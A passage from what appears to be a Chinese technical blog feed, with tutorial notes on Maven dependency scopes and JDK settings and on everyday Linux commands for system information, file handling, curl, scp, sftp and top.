&lt;dependency&gt;                              &lt;groupId&gt;实际项目&lt;/groupId&gt;               &lt;artifactId&gt;模块&lt;/artifactId&gt;           &lt;version&gt;版本&lt;/version&gt;                 &lt;type&gt;依赖类型&lt;/type&gt;                     &lt;scope&gt;依赖范围：默认是compile。可选项：compile、provided、runtime、test、system&lt;/scope&gt;      &lt;optional&gt;依赖是否传递,默认值为false。此jar包不会在其他项目中被引用加载、不参与maven的依赖传递&lt;/optional&gt;           &lt;!-- 排除传递性依赖 --&gt;                  &lt;exclusions&gt;                              &lt;exclusion&gt;                               &lt;groupId&gt;…&lt;/groupId&gt;                  &lt;artifactId&gt;…&lt;/artifactId&gt;        &lt;/exclusion&gt;                      &lt;/exclusions&gt;                     &lt;/dependency&gt;  


依赖范围： dependency.scope 详细说明

scope 依赖传递:
A -&gt; B -&gt; C, 当前项目 A，A依赖于B，B依赖于C，知道B在 A中的scope，怎么知道 C在 A 中的 scope
即，A需不需要 C的问题，本质由 C在B中的scope决定
当 C 在 B 中的scope 是test 或 provided 时，C 直接被丢弃，A不依赖C
否则 A 依赖 C，C的scope 继承与B 的scope




scope
范围
说明




compile
compileruntimetestpackage
默认配置。运行期有效，需要打入包中。该依赖需要参与当前项目的编译、测试、运行、打包


provided
compiletest
只存在编译、测试、阶段，不会打入包中表明该依赖已经提供，故只在未提供时才被使用


runtime
runtimetestpackage
编译不需要，在运行期有效，需要导入包中。（接口与实现分离）比如，你可能在编译的时候只需要JDBC API JAR，而只有在运行的时候才需要JDBC驱动实现。


test
test
测试需要，不会打入包中


system
compiletest
和provided类似，在编译、测试时有效，但是在运行时无效。和provided的区别：使用system范围的依赖时必须通过systemPath元素显式地指定依赖文件的路径。由于此类依赖不是通过Maven仓库解析的，而且往往与本机系统绑定，可能造成构建的不可移植，因此应该谨慎使用。





provided
应用场景：你定义了一个servlet，此刻得需要  servlet-api.jar 才能编译成功，但是当你达成 war 包时，你并不想将 servlet-api.jar 包进去，因为Tomcat等容器会提供，所以当启动Tomcat的时候，就不会冲突了
&lt;dependency&gt;    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;    &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;    &lt;version&gt;3.0-alpha-1&lt;/version&gt;       &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 


system
从参与度来说，和provided相同，不过被依赖项不会从maven仓库下载，而是从本地文件系统拿。需要添加systemPath的属性来定义路径。
&lt;dependency&gt;  &lt;!--自定义--&gt;  &lt;groupId&gt;com.im&lt;/groupId&gt;   &lt;!--自定义--&gt;  &lt;artifactId&gt;sdk&lt;/artifactId&gt;    &lt;!--自定义--&gt;  &lt;version&gt;1.0&lt;/version&gt;  &lt;!--system，类似provided，需要显式提供依赖的jar以后，Maven就不会在Repository中查找它--&gt;  &lt;scope&gt;system&lt;/scope&gt;  &lt;!--项目根目录下的lib文件夹下--&gt;  &lt;systemPath&gt;${basedir}/lib/sdk-1.0.jar&lt;/systemPath&gt;&lt;/dependency&gt;


Maven预定义内置属性
${basedir} 表示项目根目录,即包含pom.xml文件的目录;${version} 表示项目版本;${project.basedir} 同${basedir};${project.baseUri} 表示项目文件地址;${maven.build.timestamp} 表示项目构件开始时间;${maven.build.timestamp.format} 表示属性${maven.build.timestamp}的展示格式,默认值为yyyyMMdd-HHmm,可自定义其格式
Maven项目中指定JDK
默认版本
Maven项目中，编译器和JRE的版本默认为1.5 (所以Alt + F5刷新项目后，多个参数值会变成1.5)，参数如下(选中项目，Alt + Enter，查看项目属性)
Java Build Path下的Libraries下的JRE System Lirbrary的版本。Java Compiler下的JDK Compiler的版本。Maven下的Project Facts下的Java的版本。
项目中配置JDK版本
配置properties节点下的maven编译器信息
&lt;properties&gt;  &lt;java.version&gt;1.8&lt;/java.version&gt;&lt;/properties&gt;
配置build&gt;plugins&gt;plugins&gt;configuration节点下的source和target节点值
&lt;build&gt;  &lt;plugins&gt;    &lt;plugin&gt;      &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;      &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;      &lt;version&gt;2.3.2&lt;/version&gt;      &lt;configuration&gt;        &lt;source&gt;${java.version}&lt;/source&gt;        &lt;target&gt;${java.version}&lt;/target&gt;      &lt;/configuration&gt;    &lt;/plugin&gt;  &lt;/plugins&gt;&lt;/build&gt;
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux查看系统信息命令</title>
    <url>/20250616/b2009fa9.html</url>
    <content><![CDATA[综合信息工具
inxi -Fxz           # 显示完整系统信息 (需安装 inxi)screenfetch         # 显示美观的系统信息 (需安装)neofetch            # 另一种美观的系统信息工具 (需安装)
Linux机器是32位还是64位
getconf LONG_BIT
查看系统发行版：lsb_release
# 显示发行版详细信息cat /etc/os-release  # 显示 LSB (Linux Standard Base) 信息lsb_release -a        ############################################## 特定发行版命令 # CentOS/RHELcat /etc/redhat-releasecat /etc/centos-release# Debian/Ubuntucat /etc/debian_versionlsb_release -a
显示主机名和系统信息
hostnamectl
查看系统基本信息：uname
uname -a  # 显示所有信息uname -s  # 内核名称uname -n  # 网络节点主机名uname -r  # 内核发行版本uname -m  # 机器硬件名称
查看内核信息
cat /proc/version     # 内核版本和编译器信息dmesg | grep Linux    # 从内核环缓冲区查看启动信息
查看 CPU 信息
lscpu                # 显示 CPU 架构信息cat /proc/cpuinfo    # 详细 CPU 信息nproc                # 显示 CPU 核心数
系统磁盘信息：df
df -h               # 显示磁盘空间使用情况lsblk               # 显示块设备信息fdisk -l            # 显示磁盘分区表
系统内存条信息
# apt install dmidecodedmidecode -t memory
查看内存使用情况
free -h             # 以易读格式显示内存使用情况cat /proc/meminfo   # 详细内存信息vmstat -s           # 显示内存统计
查看网络信息
ip a                # 显示所有网络接口ifconfig            # 较旧的网络接口信息工具netstat -tulnp      # 显示网络连接和监听端口ss -tulnp           # 更现代的 socket 统计工具
进程状态：ps
格式：ps [options] [--help]参数：-A 列出所有的线程-e 列出所有的进程-f 显示详细的信息（包括命令行参数）例子: 查看java进程信息ps -ef|grep java
查看系统用户信息：who
格式 : who -[husfV] [user]说明 : 显示有哪些用户登录到系统中，显示的信息包含用户ID，使用的终端，上线时间，呆滞时间，CPU使用量，动作等等。参数说明 :    -H : 显示标题列    -u : 显示用户的闲置时间    -s : 使用简短的格式来显示    --version : 显示程式版本    -r 查看当前系统运行时间    -b 查看最后一次系统启动的时间。相关命令 : who am i  显示当前用户是谁例子： 查看最后启动时间          who -b
]]></content>
      <categories>
        <category>Linux</category>
        <category>基础命令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统文件操作命令</title>
    <url>/20250616/44c28660.html</url>
    <content><![CDATA[Linux系统文件操作命令
【chown】更改文件或目录所有者和所属组
# 格式chown [选项] [新所有者][:新组] 文件或目录...# 选项-R	递归处理，更改目录及其下所有内容的所有权-v	显示详细的处理信息-c	类似 -v，但仅在发生更改时报告-f	不显示错误信息--reference=参考文件（使用参考文件的所有者和组，而不是显式指定）
# 更改文件所有者chown username filename# 同时更改所有者和组chown username:groupname filename# 只更改文件所属组（两种等效方式）：chown :groupname filename# 或chgrp groupname filename#递归更改目录及其内容的所有权：chown -R username:groupname directory/# 使用用户ID和组ID（数字形式）chown 1000:1000 filename# 复制其他文件的所有权设置：chown --reference=source_file target_file
【chmod】更改文件或目录权限
# 格式chmod [选项] 模式 文件或目录...# 常用选项-R	递归处理，更改目录及其下所有内容的权限-v	显示详细的处理信息-c	类似 -v，但仅在发生更改时报告-f	不显示错误信息


权限表示方法：字母表示法（u/g/o/a +/-/= r/w/x）
符号	含义u	文件所有者(user)g	文件所属组(group)o	其他用户(others)a	所有用户(all)+	添加权限-	移除权限=	设置权限
范例
# 给所有者添加执行权限chmod u+x filename# 给组和其他用户移除写权限chmod go-w filename# 设置所有用户只有读权限chmod a=r filename# 给所有者读写执行，组读执行，其他用户无权限chmod u=rwx,g=rx,o= filename


权限表示方法：数字表示法（八进制数）。三位数字分别表示：所有者、组、其他用户的权限
数字	权限4	读(r)2	写(w)1	执行(x)0	无权限(-)
范例
# 设置权限为 rwxr-xr-- (754)：所有者读写执行(4+2+1 = rwx)，组读执行(4+1 = r-x)，其他用户读(4 = r--)chmod 754 filename# 常用权限设置# 所有者读写，组和其他用户只读chmod 644 filename  # 所有者完全控制，组和其他用户读执行chmod -R 755 directory # 仅所有者可读写（保护敏感文件）chmod 600 private_file 


【truncate】清空文件

清空正在使用的 catalina.out文件：truncate -s 0 catalina.out



使用 truncate 命令清空文件
# -s 参数是设置文件的大小，清空文件的话，就设定为0truncate -s 0 catalina.out


使用 echo 命令清空文件
echo -n " " &gt; catalina.out  


【tree】树形结构查看文件
apt install tree或者yum install tree
【du】查看占用的磁盘空间
格式：du [选项] [文件]参数:    -a或-all 显示目录中个别文件的大小    -b或-bytes 显示目录或文件大小时，以byte为单位    -c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和    -k或--kilobytes 以KB(1024bytes)为单位输出    -m或--megabytes 以MB为单位输出    -s或--summarize 仅显示总计，只列出最后加总的值    -h或--human-readable 以K，M，G为单位，提高信息的可读性    -x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过    -L&lt;符号链接&gt;或--dereference&lt;符号链接&gt; 显示选项中所指定符号链接的源文件大小    -S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小    -X&lt;文件&gt;或--exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件    --exclude=&lt;目录或文件&gt; 略过指定的目录或文件    -D或--dereference-args 显示指定符号链接的源文件大小    -H或--si 与-h参数相同，但是K，M，G是以1000为换算单位    -l或--count-links 重复计算硬件链接的文件。范例：du -hm 目录名称
【find】查找文件
格式 : find [path...] [expression]说明 : 将符合 expression 的文件列出来。                    



参数
全称
作用




 -atime n
access minute
在过去 n 天被读取过的文件


 -ctime n
change time
在过去 n 天文件状态（权限变更、所有者变更、链接数变更等元数据修改）被修改的文件


-mtime n
modify time
在过去 n 天文件内容被修改的文件-mtime n：精确匹配 n 天前修改的文件-mtime +n：查找修改时间超过 n 天的文件-mtime -n：查找修改时间在 n 天内的文件


 -amin n
access minute
在过去 n 分钟内被读取过的文件


 -cmin n
change time
在过去 n 分钟文件状态（权限变更、所有者变更、链接数变更等元数据修改）被修改的文件


-mmin n
modify minute
在过去 n 分钟文件内容被修改的文件


 -anewer file

比文件 file 更晚被读取过的文件


 -cnewer file

比文件 file 更新的文件


 -name filename-iname filename

符合 filename 的文件。iname 会忽略大小写


 -size n

文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k表示 kilo bytes，w 是二个位元组。


 -type c

文件类型是 c 的档案。



范例:


将当前目录及其子目录下所有扩展名是 c 的文件列出来：find . -name "*.c"


将当前目录及其子目录下所有最近 20 分钟内更新过的文件列出：find . -cmin -20


查找包含字符串的文件：find /opt/Tomcat7  -name "system.properties"|xargs grep -ri "BASCI_UPDATE"


将/usr/local/backups目录下10天前修改过的，名称包含localhost的文件删除：find /usr/local/backups -mtime +10 -name "*localhost*.*" |xargs rm -rf
find /usr/local/backups -mtime +10 -name "*.*" |xargs rm -rf或者find /usr/local/backups -mtime +10 -name "*.*" -exec rm -rf {} \;说明： 　　find：linux的查找命令，用户查找指定条件的文件 　　/usr/local/backups：想要进行清理的任意目录 　　-mtime：标准语句写法 　　＋10：查找10天前的文件，这里用数字代表天数，＋30表示查找30天前的文件"*.*"：希望查找的数据类型，"*.jpg"表示查找扩展名为jpg的所有文件，"*"表示查找所有文件，这个可以灵活运用，举一反三 　　-exec rm -rf {} \; ：find发现的结果一次性传给exec选项，删除|xargs rm -rf : 分批次的处理删除（推荐）


【grep】搜索文件内字符串
格式：grep [-no] pattern files参数：     -n 显示行号     -o 只显示匹配的串
范例：
grep  printf *    file1.c:   printf("\nHello\n");    file2.c:   printf("\nSample\n");grep -n  printf *    file1.c:4   printf("\nHello\n");    file2.c:9   printf("\nSample\n");grep -o  printf *   file1.c:   printf   file2.c:   printf# 如果搜索的串中有空格，则用引号括起来grep "asd abc" *
【wc】统计指定文件中的字节数、字数、行数
格式：wc [选项] 文件名称选项 ：   -c 统计字节数。   -l 统计行数。   -m 统计字符数。这个标志不能与 -c 标志一起使用。   -w 统计字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。   -L 打印最长行的长度。   -help 显示帮助信息   --version 显示版本信息
【cp】拷贝文件
格式：cp [-arf] source dest参数:   -a  将文件状态、权限等信息都照原状予以复制。   -r  若 source 中含有目录名，则将目录下的文件顺序拷贝至目的地。   -f  若目的地已经有相同的文件名存在，则在复制前先予以删除再行复制。
范例：
# 1. 将文件 aaa 复制一份名字为 bbb 的文件:         cp aaa bbb   # 2. 将当前目录下的所有C程序拷贝到当前目录下的Finished 子目录中：cp *.c Finished# 3. 将souce目录拷贝到当前目录下cp -arf source .
【mv】移动文件
格式：mv [-i] source dest参数：-i 若目的地已有同名文件，则先询问是否覆盖旧文件
范例：
# 1. 将文件 aaa 改名为 bbb :mv aaa bbb# 2. 将所有的C程序移至当前目录下的 target 子目录中：mv -i *.c  target
【rm】删除文件及目录
格式：rm [-ifr] name...参数：   -i  删除前逐一询问确认。   -f  即使原文件属性设为只读，也直接删除，无需逐一确认。   -r  将目录及以下之文件逐一删除。
范例
# 1.  删除所有C程序文件并删除前逐一询问确认 :rm -i *.c# 2. 将 Finished 子目录及子目录中所有文件删除 :rm -r Finished
【tail】条件查看文件内容
格式：tail [ -f ] [ -c Number | -n Number | -m Number | -b Number | -k Number ]  文件名称参数：-f：（follow）该参数用于监视File文件增长。-n  Number：从 Number 行位置读取指定文件。-c  Number：从 Number 字节位置读取指定文件-m  Number：从 Number 多字节字符位置读取指定文件，比方你的文件假设包括中文字，假设指定-c参数，可能导致截断，但使用-m则会避免该问题。-b  Number：从 Number 表示的512字节块位置读取指定文件。-k  Number：从 Number 表示的1KB块位置读取指定文件。上述命令中，都涉及到number，假设不指定，默认显示10行。Number前面可使用正负号，表示该偏移从顶部还是从尾部開始计算。tail可运行文件一般在/usr/bin/以下。
示例
# 1、监视filename文件的尾部内容（默认10行，相当于增加参数 -n 10），刷新显示在屏幕上。退出，按下CTRL+C。 tail -f filename # 2、显示filename最后20行tail -n 20 filename # 3、实时查看 Nginx 日志中出现的 40tail -f /var/log/nginx/access.log | grep "404"
【cat】 查看文件（文件拼接）
格式：cat [-AbeEnstTuv] [--help] [--version] fileName说明：把文件串连接后输出到荧幕或加 &gt; fileName 到另一个档案参数：    -A 等价于 -vET    -n或 --number 由 1 开始对所有输出的行数编号    -b或 --number-nonblank和 -n 相似，只不过对于空白行不编号    -e 等价于 –vE    -E 每行末尾显示一个$符号    -s或 --squeeze-blank 当遇到有连续两行以上的空白行，就代换为一行的空白行    -t 等价于 –vT    -T 显示制表符为 ^I    -v或 --show-nonprinting,  dos格式的回车换行显示为^M
范例：&gt; 为重定向操作符（文件存在，覆盖内容）， &gt;&gt;为重定向追加操作符（文件存在，追加）
# 1.把 textfile1 的文件内容加上行号后输入到textfile2 文件里：cat -n textfile1 &gt; textfile2# 2.把 textfile1 和 textfile2 的文件内容加上行号（空白行不加）之后将内容附加到 textfile3 cat -b textfile1 textfile2 &gt;&gt; textfile3
【more】文件查看
格式：more  [-num] [+linenum] [fileNames..]说明：类似 cat ，不过是以一页一页的方式显示。而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示。参数：    -num 一次显示的行数    +linenum 从第 num 行开始显示    fileNames 欲显示内容的文件，可为多个文件
范例：
#从第 20 行开始，每页10行显示 testfile 文件内容more -10 +20 testfile
【less】文件查看
less 是 Linux 系统中一个功能强大的文件查看工具，比传统的 more 命令更加强大和灵活。它允许用户向前或向后浏览文件内容，支持搜索、标记等多种功能
格式： less [选项] filename说明： less 的作用与 more 十分相似，都可以用来浏览文本文件的内容，不同的是 less 允许使用者往回卷动（PageUp PageDown）以浏览已经看过的部份，同时因为 less 并未在一开始就读入整个文件，因此在遇上大型文件的开启时，会比一般的文本编辑器(如vi)来的快速。常用选项：-N	显示行号-i	忽略搜索时的大小写-I	强制忽略大小写-F	如果文件内容少于一屏，自动退出-X	退出时不清理屏幕-S	截断长行而不是换行显示-r	显示控制字符-M	显示更详细的提示信息

常见操作命令




操作分类
功能




浏览操作
空格键 或 f：向下翻一页b：向上翻一页回车键 或 e：向下翻一行y 或 k：向上翻一行d：向下翻半页u：向上翻半页g：跳到文件开头G：跳到文件末尾50%：跳到文件50%的位置Ctrl+F：向前滚动一屏Ctrl+B：向后滚动一屏


搜索功能
/：向前搜索（输入模式）?：向后搜索（输入模式）n：重复上一次搜索（同方向）N：重复上一次搜索（反方向）


标记位置
m + 字母：用字母标记当前位置' + 字母：跳转到标记位置


文件操作
:e 文件名：打开新文件:n：查看下一个文件（多文件打开时）:p：查看上一个文件（多文件打开时）


其他功能
v：使用默认编辑器编辑当前文件h：显示帮助信息q：退出 less



【touch】新建文件
touch 文件名
【mkdir】创建目录
mkdir 目录名常用选项：-p	递归创建目录，如果父目录不存在则一并创建 mkdir -p project/src/main/java-m	设置目录权限，如 mkdir -m 755 dirname-v	显示创建目录的详细信息 
范例：
# 批量创建多个目录结构：mkdir -p project/{src,test}/{main,test}/{java,resources}# 创建带空格的目录mkdir "my folder"

注意事项：

如果目录已存在，mkdir 会报错，使用 -p 选项可以避免这个错误
需要有父目录的写权限才能创建子目录
目录名区分大小写
目录名可以包含空格，但需要用引号括起来： mkdir "my folder"


【ln】创建软链接
ln -s [源文件或目录] [链接名称]或者ln -sf [源文件或目录] [链接名称]说明：使用 -f 选项可以强制覆盖已存在的链接
范例：
# 在当前目录创建软连接： ln -s /etc/passwd mypasswd# 创建文件软连接：ln -s /path/to/original/file /path/to/link# 创建目录软连接ln -s /path/to/original/directory /path/to/link# 创建相对路径的软连接（推荐）：ln -s ../original/file link_name# 版本切换（通过切换软连接指向）使用 -f 选项可以强制覆盖已存在的链接ln -sf /opt/software/v2.0 /opt/software/current# 查看软链接的实际地址realpath /path/to/link# 查看软连接：输出中箭头 -&gt; 指向源文件ls -l /path/to/link# 查看软链接file /path/to/link# 删除软链接（不要加 / 在末尾，否则会删除源文件内容）rm /path/to/link
软链接验证
root@hots-Lenovo:/data# apt install treeroot@hots-Lenovo:/data# tree.├── link-real│   ├── a-real│   └── b-real│       └── test.txt└── link-soft4 directories, 1 fileroot@hots-Lenovo:/data# ln -s /data/link-real/a-real  /data/link-soft/a-softroot@hots-Lenovo:/data# root@hots-Lenovo:/data# ln -s /data/link-real/b-real  /data/link-soft/b-softroot@hots-Lenovo:/data# tree.├── link-real│   ├── a-real│   └── b-real│       └── test.txt└── link-soft    ├── a-soft -&gt; /data/link-real/a-real    └── b-soft -&gt; /data/link-real/b-real6 directories, 1 fileroot@hots-Lenovo:/data# realpath /data/link-soft/a-soft/data/link-real/a-realroot@hots-Lenovo:/data# realpath /data/link-soft/b-soft/data/link-real/b-realroot@hots-Lenovo:/data/link-soft/b-soft# ls /data/link-soft/b-softtest.txtroot@hots-Lenovo:/data# file /data/link-soft/a-soft/data/link-soft/a-soft: symbolic link to /data/link-real/a-real


注意事项


创建软连接时最好使用绝对路径，避免移动后失效
不要创建循环链接（A指向B，B指向A）
删除软连接时不要加 / 后缀
软连接的权限不影响源文件的权限
使用 -f 选项可以强制覆盖已存在的链接




软连接 vs 硬链接



特性
软连接
硬链接




创建命令
ln -s
ln


跨文件系统
支持
不支持


链接目录
支持
不支持


原始文件删除
链接失效
仍然有效


inode
与源文件不同
与源文件相同


文件类型
特殊文件（l）
普通文件





]]></content>
      <categories>
        <category>Linux</category>
        <category>基础命令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统命令行工具</title>
    <url>/20250611/f0a9e559.html</url>
    <content><![CDATA[Linux系统命令行工具
curl：用于通过 URL 传输数据
curl [选项] [URL...]


常用选项：请求相关



选项
描述




-X/--request
指定 HTTP 请求方法 (GET, POST, PUT, DELETE 等)


-H/--header
添加 HTTP 请求头


-d/--data
发送 POST 请求数据


-G/--get
将 -d 数据作为 URL 查询参数发送 (GET)


-F/--form
发送 multipart/form-data 数据 (文件上传)


-b/--cookie
发送 Cookie


-A/--user-agent
设置 User-Agent





常用选项：输出控制



选项
描述




-i/--include
输出包含响应头


-I/--head
只获取响应头


-o/--output
（小写）将输出保存到文件


-O/--remote-name
（大写）使用远程文件名保存输出


-s/--silent
静默模式 (不显示进度/错误)


-v/--verbose
显示详细操作信息


-c/--cookie-jar
保存服务器返回的 Cookie





常用选项：连接设置



选项
描述




-L/--location
跟随重定向


-k/--insecure
允许不安全的 SSL 连接


--connect-timeout
设置连接超时时间


--retry
失败重试次数





范例：基本请求
# 1. 发送 GET 请求， 获取请求内容curl https://www.baidu.comcurl -X GET https://www.baidu.com# 2. 获取响应头curl -I https://www.baidu.com# 3. 获取完整响应（包含头和请求内容）,并将输出内容存储到本地文件curl -i https://www.baidu.com -o /opt/test.txt# 4. 测试 APIcurl -X GET "https://api.example.com/users?id=123" -H "Accept: application/json"


范例：数据交互
# 1. 发送 POST 请求curl -X POST -d 'key1=value1&amp;key2=value2' https://example.com/api# 2. 发送 JSON 数据curl -X POST -H "Content-Type: application/json" \-d '{"key1":"value1", "key2":"value2"}' \https://example.com/api# 3. 发送表单数据（文件上传）curl -F "file=@/path/to/file" -F "name=file_name" https://example.com/upload# 4. 登录并保存 Cookiecurl -c cookies.txt -d "user=admin&amp;pass=123" https://example.com/logincurl -X POST -c cookies.txt -d "username=test&amp;password=123" https://example.com/login# 5. 使用保存的 Cookie 访问需要认证的页面curl -b cookies.txt https://example.com/profile# 6. 从标准输入读取 Cookieecho "name=value" | curl -b - https://example.com# 7. 清除会话（使用空 Cookie 文件）curl -b empty_cookies.txt https://example.com/logout


范例：认证与安全
# 1. 基本认证curl -u username:password https://example.com# 2. Bearer Token 认证curl -H "Authorization: Bearer token_string" https://example.com/api# 3. 忽略 SSL 证书验证（测试用）curl -k https://example.com


范例：下载文件
# 1.下载文件并保存curl -o local_filename https://example.com/remote_file# 2.使用远程文件名保存curl -O https://example.com/filename.ext# 3.断点续传（从中断处继续）curl -C - -O https://example.com/large_file# 4.从第1000字节开始下载curl -C 1000 -O http://example.com/largefile.zip# 5.显示进度条curl -C - --progress-bar -O http://example.com/largefile.zip# 6.并行下载多个文件curl -O https://example.com/file1 -O https://example.com/file2# 7. 限制下载速度（字节/秒）curl --limit-rate 100K -O https://example.com/large_file


范例（高级用法）：代理访问
# 通过代理访问curl -x [代理地址]:[端口] [目标URL]# 使用HTTP代理curl -x http://proxy.example.com:8080 http://target.example.com# 使用HTTPS代理curl -x https://secure-proxy.example.com:8443 https://target.example.com# 带认证的代理：用户名密码认证curl -x http://username:password@proxy.example.com:8080 http://target.example.com# 带认证的代理：用户名密码认证（分开指定）curl -x http://proxy.example.com:8080 -U username:password http://target.example.com


范例：日常使用
# 获取IP地址curl ipinfo.io/ipcurl cip.cc


kill：杀死进程
格式： kill [ -s signal ] pid ...      kill -l [ signal ]说明：kill 送出一个特定的信号 (signal) 给进程号为 pid 的进程。根据该信号而做特定的动作, 若没有指定,默认是送出终止 (TERM) 信号参数：    -s (signal) : 其中常用的一个信号(9) 杀死进程; 详细的信号可以用 kill -l    -l (signal) : 列出所有可用的信号名称范例：  1. 将 pid 为 323 的进程杀死 ： kill -9 323  2. 将 pid 为 456 的进程重跑 (restart) : kill -HUP 456
scp：从其他机器拷贝文件夹
格式：scp -r 文件夹名(源) 用户名@机器名:/路径（目的）之后输入，目标机器的用户密码。
范例：
scp -r /index1/DAYAIR/Lucene/20160930  root@117.122.222.74:/index1/dayalib
sftp：上传文件/下载


连接到服务器
# 1. 连接到远程服务器sftp username@hostname# 2. 指定端口连接 (默认22)sftp -P port_number username@hostname# 3. 使用密钥认证连接sftp -i /path/to/private_key username@hostname


连接上服务器之后的常用命令



本地文件操作
远程文件操作
文件传输
其他命令




lls   ： 列出本地目录内容
ls   ： 列出远程目录内容
put local_file [remote_path] ： 上传本地文件到远程
help      ： 显示帮助信息


lcd   ： 更改本地工作目录
cd   ： 更改远程工作目录
get remote_file [local_path] ： 下载远程文件到本地
exit 或 quit ： 退出SFTP会话


lmkdir ： 在本地创建目录
mkdir  ： 在远程创建目录
mput local_files       ： 上传多个本地文件
!command    ： 在本地执行shell命令


lpwd  ： 显示本地当前目录
pwd   ： 显示远程当前目录
mget remote_files       ： 下载多个远程文件




rm   ： 删除远程文件





rmdir  ： 删除远程目录





rename ： 重命名远程文件





chmod  ： 更改远程文件权限





chown  ： 更改远程文件所有者



















实用示例（命令行直接传输）
# 不进入交互模式,命令行直接传输文件# 从远程下载文件sftp username@hostname:/remote/file.txt /local/path/# 上传文件到远程sftp username@hostname &lt;&lt;&lt; $'put /local/file.txt /remote/path/'


实用示例（远程连接服务器之后）
############################################################# 1. 上传下载文件# 上传文件sftp&gt; put local_file.txt /remote/path/# 下载文件sftp&gt; get /remote/path/remote_file.txt ~/downloads/############################################################# 2. 批量传输# 上传所有.txt文件sftp&gt; mput *.txt# 下载所有.jpg文件sftp&gt; mget *.jpg############################################################# 3. 目录操作# 创建远程目录sftp&gt; mkdir new_folder# 切换远程目录sftp&gt; cd /path/to/directory# 列出远程目录内容sftp&gt; ls -l############################################################# 4. 保留文件属性传输# 上传并保留时间戳sftp&gt; put -p local_file.txt# 下载并保留权限sftp&gt; get -P remote_file.txt############################################################


高级用法
#  1. 使用压缩传输sftp -C username@hostname# 2. 限制带宽sftp -l 100 username@hostname  # 限制为100 Kbit/s# 3. 使用代理连接sftp -o "ProxyCommand=nc -X connect -x proxy:port %h %p" username@hostname



注意事项:

SFTP 不同于 FTP，它使用 SSH 端口(默认22)
文件传输是加密的，比传统FTP更安全
某些服务器可能限制文件大小或传输速率
使用密钥认证比密码认证更安全


top：实时显示系统中各个进程的资源占用状况
top是一个动态显示过程，即可以通过用户按键来不断刷新当前状态。如果在前台执行该命令，它将独占前台，直到用户终止该程序为止。比较准确的说，top命令提供了实时的对系统处理器的状态监视。它将显示系统中CPU最“敏感”的任务列表。该命令可以按CPU使用。内存使用和执行时间对任务进行排序；而且该命令的很多特性都可以通过交互式命令或者在个人定制文件中进行设定
命令说明1.  命令格式： top [参数]2.  命令功能： 显示当前系统正在执行的进程的相关信息，包括进程ID、内存占用率、CPU占用率等3.  命令参数        -b 批处理        -c 显示完整的治命令        -I 忽略失效过程        -s 保密模式        -S 累积模式        -i&lt;时间&gt; 设置更新间隔时间        -u&lt;用户名&gt; 指定用户名        -p&lt;进程号&gt; 指定进程        -n&lt;次数&gt;

补充top使用技巧：


多核CPU监控在top基本视图中，按键盘数字“1”，可监控每个逻辑CPU的状况：


高亮显示当前运行进程敲击键盘“b”（打开/关闭加亮效果 ）


通过”shift + &gt;”或”shift + &lt;”可以向右或左改变排序列下图是按一次”shift + &gt;”的效果图,视图现在已经按照%MEM来排序。



范例：


实例1：显示指定的进程信息
top -p 2885



实例2: 循环显示的次数
命令：  top -n 2说明：表示更新两次后终止更新显示


实例3：显示进程信息，并具体说明



命令输出的每一行的具体信息：



内容
具体意义




第一行：任务队列信息，同 uptime 命令的执行结果
top - 18:10:32 up  2:39,  2 users,  load average: 0.23, 0.11, 0.0618:10:32            ： 当前系统时间  up  2:39            ： 系统已经运行了2小时39分钟（在这期间系统没有重启过） 2 users             ： 当前有2个用户登录系统  load average: 0.23, 0.11, 0.06 ： load average后面的三个数分别是1分钟、5分钟、15分钟的负载情况。load average 数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。


第二行：Tasks — 任务（进程）
Tasks: 213 total,   1 running, 210 sleeping,   0 stopped,   2 zombie系统现在共有213个进程，其中处于运行中的有1个，210个在休眠，stoped状态的有0个，zombie状态（僵尸）的有2个


第三行：cpu状态信息
%Cpu(s):  0.7 us,  0.6 sy,  0.0 ni, 98.7 id,  0.0 wa,  0.0 hi,  0.1 si,  0.0 st在这里CPU的使用比率和windows概念不同，需要理解linux系统用户空间和内核空间的相关知识0.7 us :用户空间占用CPU的百分比。0.6 sy :内核空间占用CPU的百分比。0.0 ni :改变过优先级的进程占用CPU的百分比98.7 id:空闲CPU百分比0.0 wa :IO等待占用CPU的百分比0.0 hi :硬中断（Hardware IRQ）占用CPU的百分比0.1 si :软中断（Software Interrupts）占用CPU的百分比0.0 st :虚拟机占用百分比


第四行：内存状态
KiB Mem : 16212604 total,  4243632 free, 10135032 used,  1833940 buff/cache16212604 total     : 物理内存总量10135032 used      : 使用中的内存总量：现在系统内核控制的内存数4243632 free       : 空闲内存总量：内核还未纳入其管控范围的数量1833940 buff/cache : 缓存的内存量纳入内核管理的内存不见得都在使用中，还包括过去使用过的现在可以被重复利用的内存，内核并不把这些可被重新使用的内存交还到free中去，因此在linux上free内存会越来越少，但不用为此担心。若需要计算可用内存数，这里有个近似的计算公式：第四行的free + 第四行的buffers + 第五行的cached/avail Mem对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了


第五行：swap交换分区信息
KiB Swap:  8126460 total,  8126460 free,        0 used.  5577340 avail Mem8126460 total     : 交换区总量0 used            : 使用的交换区总量8126460 free      : 空闲交换区总量5577340 avail Mem : 可用交换取总量


第六行 ：空行



第七行以下：各进程（任务）的状态监控：
